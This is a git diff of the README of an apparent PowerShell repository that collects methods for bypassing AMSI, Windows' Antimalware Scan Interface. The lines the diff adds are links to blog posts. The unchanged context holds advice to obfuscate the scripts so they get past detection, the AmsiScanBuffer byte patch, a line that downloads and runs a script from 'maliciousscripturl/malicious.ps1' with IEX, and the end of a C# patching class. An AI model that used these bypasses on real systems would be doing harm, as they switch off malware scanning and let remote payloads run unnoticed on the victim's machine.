@@ -1,7 +1,7 @@
 # Amsi-Bypass-Powershell #
 This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance methods i found on different Blog Posts.
 
-Most of the scripts are detected by AMSI itself. So you have to find the [trigger](https://github.com/RythmStick/AMSITrigger) and change the signature at the part via variable/function renaming, string replacement or encoding and decoding at runtime. Alternatively obfuscate them via ISESteroids and or Invoke-Obfuscation to get them working.
+Most of the scripts are detected by AMSI itself. So you have to find the [trigger](https://github.com/RythmStick/AMSITrigger) and change the signature at the part via variable/function renaming, string replacement or encoding and decoding at runtime. Alternatively obfuscate them via ISESteroids and or Invoke-Obfuscation to get them working. You can also take a look at my [blog post](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/) about manually changing the signature to get a valid bypass again.
 
 1. [Patching amsi.dll AmsiScanBuffer by rasta-mouse](#Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse "Goto Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse")
 2. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
@@ -17,6 +17,7 @@ Most of the scripts are detected by AMSI itself. So you have to find the [trigge
 12. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
 13. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
 14. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
+
 
 # Patching amsi.dll AmsiScanBuffer by rasta-mouse #
 ```
@@ -68,6 +69,9 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 IEX([Net.Webclient]::new().DownloadString("https://maliciousscripturl/malicious.ps1"))
 ```
 # Amsi ScanBuffer Patch #
+
+Egghunter with blog post: https://www.contextis.com/us/blog/amsi-bypass
+
 ```
 Write-Host "-- AMSI Patch"
 Write-Host "-- Paul Laîné (@am0nsec)"
@@ -706,3 +710,4 @@ class Win32
 Add-Type -TypeDefinition $Winpatch -Language CSharp
 [patch]::it()
 ```
+
